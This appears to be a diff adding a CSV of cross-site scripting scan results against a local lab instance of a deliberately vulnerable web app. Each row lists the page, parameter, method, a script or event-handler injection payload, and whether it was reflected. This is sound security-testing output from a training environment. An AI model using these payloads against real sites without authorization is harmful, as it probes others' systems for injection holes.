@@ -1,0 +1,513 @@
+page_url,param_tested,method,payload,status,reflected,dom_rendered,stored_candidate_pages,evidence,baseline_len,response_len
+http://localhost:8080/vulnerabilities/weak_id/,q,POST,<script>alert('XSS')</script>,200,False,False,,,3511,3511
+http://localhost:8080/vulnerabilities/weak_id/,q,POST,"""><script>alert('XSS')</script>",200,False,False,,,3511,3511
+http://localhost:8080/vulnerabilities/weak_id/,q,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,3511,3511
+http://localhost:8080/vulnerabilities/weak_id/,q,POST,<svg/onload=alert('XSS')>,200,False,False,,,3511,3511
+http://localhost:8080/vulnerabilities/weak_id/,q,POST,<body onload=alert('XSS')>,200,False,False,,,3511,3511
+http://localhost:8080/vulnerabilities/weak_id/,q,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,3511,3511
+http://localhost:8080/vulnerabilities/weak_id/,q,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,3511,3511
+http://localhost:8080/vulnerabilities/weak_id/,q,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,3511,3511
+http://localhost:8080/vulnerabilities/sqli/,id,GET,<script>alert('XSS')</script>,200,False,False,,content_length_change,4538,174
+http://localhost:8080/vulnerabilities/sqli/,Submit,GET,<script>alert('XSS')</script>,200,False,False,,,4538,4538
+http://localhost:8080/vulnerabilities/sqli/,id,GET,"""><script>alert('XSS')</script>",200,False,False,,content_length_change,4538,174
+http://localhost:8080/vulnerabilities/sqli/,Submit,GET,"""><script>alert('XSS')</script>",200,False,False,,,4538,4538
+http://localhost:8080/vulnerabilities/sqli/,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,content_length_change,4538,166
+http://localhost:8080/vulnerabilities/sqli/,Submit,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,4538,4538
+http://localhost:8080/vulnerabilities/sqli/,id,GET,<svg/onload=alert('XSS')>,200,False,False,,content_length_change,4538,166
+http://localhost:8080/vulnerabilities/sqli/,Submit,GET,<svg/onload=alert('XSS')>,200,False,False,,,4538,4538
+http://localhost:8080/vulnerabilities/sqli/,id,GET,<body onload=alert('XSS')>,200,False,False,,content_length_change,4538,166
+http://localhost:8080/vulnerabilities/sqli/,Submit,GET,<body onload=alert('XSS')>,200,False,False,,,4538,4538
+http://localhost:8080/vulnerabilities/sqli/,id,GET,"'""><img src=x onerror=alert(1)>",200,True,False,,reflected_payload|content_length_change,4538,190
+http://localhost:8080/vulnerabilities/sqli/,Submit,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,4538,4538
+http://localhost:8080/vulnerabilities/sqli/,id,GET,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,content_length_change,4538,185
+http://localhost:8080/vulnerabilities/sqli/,Submit,GET,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,4538,4538
+http://localhost:8080/vulnerabilities/sqli/,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,content_length_change,4538,180
+http://localhost:8080/vulnerabilities/sqli/,Submit,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,4538,4538
+http://localhost:8080/vulnerabilities/javascript/,token,POST,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,phrase,POST,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,send,POST,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,token,POST,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,phrase,POST,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,send,POST,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,token,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,phrase,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,send,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,token,POST,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,phrase,POST,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,send,POST,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,token,POST,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,phrase,POST,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,send,POST,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,token,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,phrase,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,send,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,token,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,phrase,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,send,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,phrase,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/javascript/,send,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/security.php,security,POST,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/security.php,seclev_submit,POST,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/security.php,user_token,POST,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/security.php,security,POST,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/security.php,seclev_submit,POST,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/security.php,user_token,POST,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/security.php,security,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/security.php,seclev_submit,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/security.php,user_token,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/security.php,security,POST,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/security.php,seclev_submit,POST,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/security.php,user_token,POST,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/security.php,security,POST,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/security.php,seclev_submit,POST,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/security.php,user_token,POST,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/security.php,security,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/security.php,seclev_submit,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/security.php,user_token,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/security.php,security,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/security.php,seclev_submit,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/security.php,user_token,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/security.php,security,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/security.php,seclev_submit,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/security.php,user_token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/exec/,ip,POST,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/exec/,Submit,POST,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/exec/,ip,POST,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/exec/,Submit,POST,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/exec/,ip,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/exec/,Submit,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/exec/,ip,POST,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/exec/,Submit,POST,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/exec/,ip,POST,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/exec/,Submit,POST,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/exec/,ip,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/exec/,Submit,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/exec/,ip,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/exec/,Submit,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/exec/,ip,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/exec/,Submit,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/csp/,include,POST,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/csp/,include,POST,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/csp/,include,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/csp/,include,POST,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/csp/,include,POST,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/csp/,include,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/csp/,include,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/csp/,include,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,username,GET,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,password,GET,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,Login,GET,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,username,GET,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,password,GET,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,Login,GET,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,username,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,password,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,Login,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,username,GET,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,password,GET,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,Login,GET,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,username,GET,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,password,GET,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,Login,GET,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,username,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,password,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,Login,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,username,GET,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,password,GET,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,Login,GET,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,username,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,password,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/brute/,Login,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,MAX_FILE_SIZE,POST,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,uploaded,POST,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,Upload,POST,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,MAX_FILE_SIZE,POST,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,uploaded,POST,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,Upload,POST,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,MAX_FILE_SIZE,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,uploaded,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,Upload,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,MAX_FILE_SIZE,POST,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,uploaded,POST,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,Upload,POST,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,MAX_FILE_SIZE,POST,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,uploaded,POST,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,Upload,POST,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,MAX_FILE_SIZE,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,uploaded,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,Upload,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,MAX_FILE_SIZE,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,uploaded,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,Upload,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,MAX_FILE_SIZE,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,uploaded,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/upload/,Upload,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/setup.php,create_db,POST,<script>alert('XSS')</script>,200,False,False,,,4156,4156
+http://localhost:8080/setup.php,user_token,POST,<script>alert('XSS')</script>,200,False,False,,,4156,4156
+http://localhost:8080/setup.php,create_db,POST,"""><script>alert('XSS')</script>",200,False,False,,,4156,4156
+http://localhost:8080/setup.php,user_token,POST,"""><script>alert('XSS')</script>",200,False,False,,,4156,4156
+http://localhost:8080/setup.php,create_db,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,4156,4156
+http://localhost:8080/setup.php,user_token,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,4156,4156
+http://localhost:8080/setup.php,create_db,POST,<svg/onload=alert('XSS')>,200,False,False,,,4156,4156
+http://localhost:8080/setup.php,user_token,POST,<svg/onload=alert('XSS')>,200,False,False,,,4156,4156
+http://localhost:8080/setup.php,create_db,POST,<body onload=alert('XSS')>,200,False,False,,,4156,4156
+http://localhost:8080/setup.php,user_token,POST,<body onload=alert('XSS')>,200,False,False,,,4156,4156
+http://localhost:8080/setup.php,create_db,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,4156,4156
+http://localhost:8080/setup.php,user_token,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,4156,4156
+http://localhost:8080/setup.php,create_db,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,4156,4156
+http://localhost:8080/setup.php,user_token,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,4156,4156
+http://localhost:8080/setup.php,create_db,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,4156,4156
+http://localhost:8080/setup.php,user_token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,4156,4156
+http://localhost:8080/vulnerabilities/xss_d/,default,GET,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/xss_d/,default,GET,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/xss_d/,default,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/xss_d/,default,GET,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/xss_d/,default,GET,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/xss_d/,default,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/xss_d/,default,GET,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/xss_d/,default,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/xss_r/,name,GET,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/xss_r/,name,GET,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/xss_r/,name,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/xss_r/,name,GET,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/xss_r/,name,GET,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/xss_r/,name,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/xss_r/,name,GET,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/xss_r/,name,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,step,POST,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,password_new,POST,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,password_conf,POST,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,Change,POST,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,step,POST,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,password_new,POST,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,password_conf,POST,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,Change,POST,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,step,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,password_new,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,password_conf,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,Change,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,step,POST,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,password_new,POST,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,password_conf,POST,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,Change,POST,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,step,POST,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,password_new,POST,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,password_conf,POST,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,Change,POST,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,step,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,password_new,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,password_conf,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,Change,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,step,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,password_new,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,password_conf,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,Change,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,step,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,password_new,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,password_conf,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/captcha/,Change,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/sqli_blind/,id,GET,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/sqli_blind/,Submit,GET,<script>alert('XSS')</script>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/sqli_blind/,id,GET,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/sqli_blind/,Submit,GET,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/sqli_blind/,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/sqli_blind/,Submit,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/sqli_blind/,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/sqli_blind/,Submit,GET,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/sqli_blind/,id,GET,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/sqli_blind/,Submit,GET,<body onload=alert('XSS')>,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/sqli_blind/,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/sqli_blind/,Submit,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/sqli_blind/,id,GET,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/sqli_blind/,Submit,GET,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/sqli_blind/,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/vulnerabilities/sqli_blind/,Submit,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
+http://localhost:8080/login.php,username,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
